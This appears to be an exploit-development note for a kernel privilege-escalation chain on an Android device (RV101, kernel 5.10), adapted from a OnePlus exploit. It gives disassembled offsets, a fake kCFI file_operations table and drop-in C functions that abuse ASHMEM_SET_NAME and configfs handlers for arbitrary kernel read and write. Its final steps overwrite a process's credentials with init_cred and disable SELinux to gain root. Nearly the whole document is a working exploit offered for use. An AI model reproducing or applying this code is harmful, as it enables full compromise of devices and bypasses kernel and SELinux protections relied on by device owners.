# GhostLock RV101 — W2 configfs arbitrary read/write primitive (line-by-line comparison OnePlus → RV101)

> 中文版：[GHOSTLOCK_W2_FOPS_CONFIGFS_RV101.md](GHOSTLOCK_W2_FOPS_CONFIGFS_RV101.md)

> 📌 **Basis of fact**: wherever this document touches facts such as device generation, kernel config, CVE status, GhostLock offsets and product structure, [`reports/FACTS.md`](FACTS.md) is authoritative (a single authoritative fact table; that table decides any conflict).


> 2026-08-20. This document compares the mechanism of OnePlus `configfs_read_once`/`configfs_write_once` **line by line** against
> RV101 (5.10.209, Clang kCFI); all offsets are taken directly by disassembling `configfs_read_bin_file`
> (0x49ec40) and `configfs_write_bin_file` (0x49ee00) on this machine, not estimated.
> References: `research/ghostlock_refs/extracted/oneplus/.../src/core/{util.c,fops.c,target.h}`.

## 0. Core concept (one diagram)

```
open("/dev/ashmem") → file->private_data = ashmem_area (name[0..] controllable via SET_NAME)
                            │
   use the mode-2 write primitive to change ashmem_misc.fops(+0x10) to fake_fops (inside the sprayed page)
                            │
   read(fd)/write(fd) now jump into fake_fops's .read/.write = configfs_*_bin_file.cfi_jt
                            │
   configfs_*_bin_file treats file->private_data (= ashmem_area) as a configfs_buffer
   and reads/writes buffer->bin_buffer (0x58), an "arbitrary kernel address" → arbitrary kernel read/write
```

Key: `configfs_buffer.bin_buffer` (offset **0x58**) is the target address for arbitrary read/write; it is
overwritten starting at the 58th byte of `ashmem_area.name` (minus the 11-byte prefix), and `name` can be written with
arbitrary bytes (including NUL, using the split-ioctl technique) via `ioctl(ASHMEM_SET_NAME)`.

---

## 1. Field offsets of RV101 configfs_buffer (settled by disassembly)

Both `configfs_write_bin_file` and `configfs_read_bin_file` use `file->private_data` as the buffer:

```asm
configfs_write_bin_file:   ldr x24, [x0, #0xd8]     ; x24 = file->private_data (buffer)
configfs_read_bin_file:    ldr x26, [x0, #0xd8]     ; x26 = file->private_data
```

| Field | offset | Type | Evidence |
|---|---|---|---|
| count | 0x00 | size_t | (not used directly) |
| pos | 0x08 | loff_t | (not used directly) |
| page | 0x10 | char * | 5.10 layout |
| ops | 0x18 | ptr | 5.10 layout |
| mutex | 0x20 | struct mutex (32B) | `add x19, x24, #0x20; bl mutex_lock` |
| **needs_read_fill** | **0x50** | int | `ldr w8, [x26, #0x50]` (read decides whether to fill) |
| read_in_progress | 0x54 | bool | `ldrb w8, [x24, #0x54]` (write checks) |
| write_in_progress | 0x55 | bool | `strb w8, [x24, #0x55]` (write sets 1) |
| **bin_buffer** | **0x58** | char * | `ldr x23, [x24, #0x58]` (write target / read source) |
| **bin_buffer_size** | **0x60** | int | `ldrsw x1, [x24, #0x60]` |
| **cb_max_size** | **0x64** | int | `ldrsw x8, [x24, #0x64]` |
| item | 0x68 | struct config_item * | `ldr x0, [x26, #0x68]` |
| owner | 0x70 | ptr | 5.10 layout |
| bin_attr | 0x78 | ptr | `ldr x8, [x26, #0x78]` |

> ⚠️ These values differ from OnePlus 6.12 (6.12 has bin_buffer=88/bin_buffer_size=96/page=16/
> needs_read_fill=80). **Do not copy OnePlus's `CFG_*_OFF`**; use the table above.

---

## 2. Write primitive: `configfs_write_once` (against `configfs_write_bin_file`)

What the OnePlus version (`util.c:791`) does:
```c
ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128]; memset(blob, 0, 128);
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);   // bin_buffer = target
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len); // bin_buffer_size = len
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);       // cb_max_size = 0
  try_set_ashmem_name_blob(fd, blob, 128);   // ioctl SET_NAME (split writes including NUL)
  return pwrite(fd, data, len, 0);           // triggers configfs_write_bin_file
}
```

RV101 counterpart (only the offsets change; the logic is the same):
```c
put64(blob, 0x58 - 11, target);   // bin_buffer  = target
put32(blob, 0x60 - 11, len);      // bin_buffer_size = len
put32(blob, 0x64 - 11, 0);        // cb_max_size = 0
```

`pwrite(fd, data, len, 0)` enters `configfs_write_bin_file`, whose disassembly compares as follows:

```asm
0x49ee38: ldrb w8, [x24, #0x54]     ; if (buffer->read_in_progress) return -EBUSY
0x49ee3c: cbz  w8, 0x49ee48
0x49ee40: mov  x20, #-0x1a          ; -26 (the EBUSY path)
0x49ee48: mov  w8, #1
0x49ee4c: strb w8, [x24, #0x55]     ; buffer->write_in_progress = 1
0x49ee50: ldr  x8, [x21]            ; x8  = *ppos
0x49ee54: ldrsw x1, [x24, #0x60]    ; x1  = bin_buffer_size
0x49ee58: add  x0, x8, x20          ; x0  = *ppos + count
0x49ee5c: cmp  x0, x1
0x49ee60: b.ls 0x49ee7c             ; if *ppos+count <= size → write directly (skip realloc)
0x49ee7c: ldr  x23, [x24, #0x58]    ; x23 = bin_buffer
0x49eedc: mov  x0, x23              ; dst = bin_buffer
0x49eee0: mov  x2, x21              ; ppos
0x49eee4: mov  x3, x22              ; from = user buf
0x49eee8: mov  x4, x20              ; count
0x49eeec: bl   0x4116f0             ; simple_write_to_buffer(bin_buffer, .., ppos, buf, count)
```

**Reading**: `pwrite(fd, data, len, 0)` makes `*ppos=0` and `count=len`, and `0+len <= bin_buffer_size(=len)`
holds → it takes the direct-write path at `0x49ee7c` and copies `data` to `bin_buffer+0 = target`. **One write completes an arbitrary write**.

(`cb_max_size` is only consulted when `*ppos+count > bin_buffer_size`; setting it to 0 avoids accidentally entering the vmalloc
reallocation path; normally `0+len<=len` never touches it.)

---

## 3. Read primitive: `configfs_read_once` (against `configfs_read_bin_file`)

OnePlus uses `page`(0x10) and goes through `configfs_read_file`; **RV101 is simpler — both read and write use `bin_buffer`**,
going directly through `configfs_read_bin_file`:

```c
ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128]; memset(blob, 0, 128);
  put64(blob, 0x58 - 11, target);   // bin_buffer = target
  put32(blob, 0x60 - 11, len);      // bin_buffer_size = len
  put32(blob, 0x50 - 11, 0);        // needs_read_fill = 0 → skip the item-ops fill
  try_set_ashmem_name_blob(fd, blob, 128);
  return pread(fd, data, len, 0);
}
```

`pread(fd, data, len, 0)` enters `configfs_read_bin_file`; the key path:

```asm
0x49ecc0: ldr  w8, [x26, #0x50]    ; needs_read_fill
0x49eccc: cbz  w8, 0x49ede0        ; ==0 → jump straight to the read (do not call item ops)
   ... (fill path: vmalloc, call item ops; we do not take it) ...
0x49ede0: ldr  x3, [x26, #0x58]    ; x3 = bin_buffer
0x49ede4: ldrsw x4, [x26, #0x60]   ; x4 = bin_buffer_size
0x49ede8: mov  x0, x22             ; x0 = buf (user)
0x49edec: mov  x1, x21             ; x1 = count
0x49edf0: mov  x2, x20             ; x2 = ppos
0x49edf4: bl   0x411634            ; simple_read_from_buffer(buf, count, ppos, bin_buffer, size)
```

**Reading**: when `needs_read_fill=0`, it directly does `simple_read_from_buffer(buf, len, ppos=0, bin_buffer=target, size=len)`
→ reads `len` bytes from `target` into `data`. **One read completes an arbitrary read**.

---

## 4. The fake file_operations table (RV101 must fill `.cfi_jt` and use the .read/.write slots)

RV101 kCFI: the fops table stores `.cfi_jt` jump-table addresses (not the function bodies). And RV101 configfs **uses `.read`/`.write`
(+0x10/+0x18), not `.read_iter`/`.write_iter`** (only OnePlus 6.12 has the iter version). So the fake fops:

| Slot | offset | Fill (RV101 `.cfi_jt` offset) |
|---|---|---|
| llseek | 0x08 | `CFI_NOOP_LLSEEK_OFF` (0x121ab88) |
| read | 0x10 | `CFI_CONFIGFS_READ_BIN_OFF` (0x1238e20) |
| write | 0x18 | `CFI_CONFIGFS_WRITE_BIN_OFF` (0x1238670) |
| unlocked_ioctl | 0x50 | `CFI_ASHMEM_IOCTL_OFF` (0x123e118) ← needed for SET_NAME |
| compat_ioctl | 0x58 | `CFI_ASHMEM_COMPAT_IOCTL_OFF` (0x123e0b8) |
| mmap | 0x60 | `CFI_ASHMEM_MMAP_OFF` (0x122a630) |
| open | 0x70 | `CFI_ASHMEM_OPEN_OFF` (0x123fb70) |
| release | 0x80 | `CFI_ASHMEM_RELEASE_OFF` (0x123ef48) |
| show_fdinfo | 0x0e0 | `CFI_ASHMEM_SHOW_FDINFO_OFF` (0x121cd20) |

The remaining slots are filled with 0. These `CFI_*_OFF` values have already been written into `target_rv101.h` (corresponding to the
link-time VA of `text_addr(CFI_*_OFF)`; KASLR converts them with `text_addr()`).

---

## 5. Split NUL writes for ASHMEM_SET_NAME (`try_set_ashmem_name_blob`)

`ASHMEM_SET_NAME` has `strcpy` semantics (truncates at NUL), so a 128-byte blob containing NUL cannot be written in one go.
The OnePlus solution (`util.c:337-371`) can be copied as is:

```c
#define ASHMEM_SET_NAME _IOW(0x77, 1, char[256])   // RV101 ASHMEM_NAME_LEN=256
static int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[256]; memset(name, 0x41, 256);          // fill everything with 'A'=0x41
  for (size_t i = 0; i < len; i++) name[i] = blob[i] ? blob[i] : 1;  // NUL→0x01
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}
static int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[256]; memset(name, 0x41, 256);
  for (size_t i = 0; i < pos; i++) name[i] = blob[i] ? blob[i] : 1;
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}
static int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len)) return -1;
  for (size_t i = len; i > 0; i--)                 // from the tail, set each position that should be 0 back to 0
    if (blob[i-1] == 0 && try_put_blob_zero_at(fd, blob, i-1)) return -1;
  return 0;
}
```

> RV101 confirmation of `ASHMEM_NAME_LEN`: disassemble the SET_NAME branch of `ashmem_ioctl` or check
> `ashmem_open`; the default 5.10 staging ashmem is 256. If SET_NAME is measured to accept only 128, change `name[]`
> to 128 (all the fields we need are within the first 128 bytes).

---

## 6. Complete RV101 primitive (can drop straight into util.c)

```c
/* arbitrary kernel read/write (already converted to the RV101 configfs_buffer offsets + 11-byte prefix) */
ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128]; memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF      - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, (uint32_t)len);
  put32(blob, CFG_CB_MAX_SIZE_OFF     - ASHMEM_NAME_PREFIX_LEN, 0);
  if (try_set_ashmem_name_blob(fd, blob, sizeof(blob))) return -1;
  return pwrite(fd, data, len, 0);
}
ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128]; memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF      - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, (uint32_t)len);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  if (try_set_ashmem_name_blob(fd, blob, sizeof(blob))) return -1;
  return pread(fd, data, len, 0);
}
uint64_t kernel_read64(int fd, uintptr_t a){ uint64_t v=0; return configfs_read_once(fd,a,&v,8)==8?v:0; }
```

(`put64`/`put32`/`CFG_*_OFF`/`ASHMEM_NAME_PREFIX_LEN` are all already in `target_rv101.h`; the existing `put64p/put32p`
in `util.c` can be reused for `put64/put32`, or renamed.)

---

## 7. Implementation-order reminder (against OnePlus fops.c)

1. Add the fake fops to the sprayed page (§4 table) + a scratch area that can be written back.
2. mode-2 write: `fake_fops` → `data_addr(ASHMEM_MISC) + 0x10` (**+0x10, not +0x18**).
3. `open("/dev/ashmem")` → fd; first run `configfs_write_once`/`read_once` as a self-check against the fake fops'
   own `llseek` slot (the verification technique of OnePlus `try_cfi_stage`/`repair_fake_fops_llseek`).
4. After verification: walk the task list from `data_addr(INIT_TASK + TASK_TASKS_OFF)`, compare `tgid`(0x5cc) to find the
   child → `kernel_write64(child_task + TASK_CRED_OFF, data_addr(INIT_CRED))`.
5. The child does `setuid(0)` + `setenforce 0` → root (the `main.c` skeleton already exists).
